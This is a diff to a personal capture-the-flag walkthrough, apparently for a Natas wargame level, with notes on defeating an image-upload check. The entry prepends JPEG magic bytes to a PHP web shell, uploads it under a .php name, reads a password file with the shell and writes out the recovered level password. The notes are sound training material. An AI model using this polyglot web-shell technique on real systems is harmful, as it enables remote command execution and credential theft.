@@ -428,12 +428,45 @@ lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
 
 lvl 14:
 -----------
+->
+same task but this was added :
+> For security reasons, we now only accept image files!
+->
+this time only the file verification code was changed...
+it added exif_imagetype()
+https://www.php.net/manual/en/function.exif-imagetype.php
+which added a check for magic bytes
+->
+the plan is:
+# via python create a file that will have the magic bytes
+  of a jpeg (ff d8 ff e0) ==> taken from gary keesler magic byte list
+# append to the file the payload right after
+# change the extention (via burp as last task) 
+   ==> name="filename" c6k17fzr39.jpg ==> c6k17fzr39.php 
+#
+->
+python -c 'f=open("payload", "wb");  f.write(bytes.fromhex("ffd8ffe0")); f.write("<?php system($_GET['cmd'])?>".encode()) ;f.close()'
+                                                                                                         
+file payload
+payload: JPEG image data
+                                                                                                         
+cat payload 
+����<?php system($_GET[cmd])?>
 
+the ���� characters are like this because this is 
+the binary data we added in the beggining marking
+the start of an image file (ffd8ffe0 - jpeg magic bytes)
 ->
+i recommend to do ls & than xxd on the php files
+that you find there to see more techniques from
+other people :)
+
+example ?cmd=xxd 06r1r0cxys.php
 ->
+?cmd=cat /etc/natas_webpass/natas14
 ->
-->
-->
+qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
+
 
 lvl 15:
 -----------
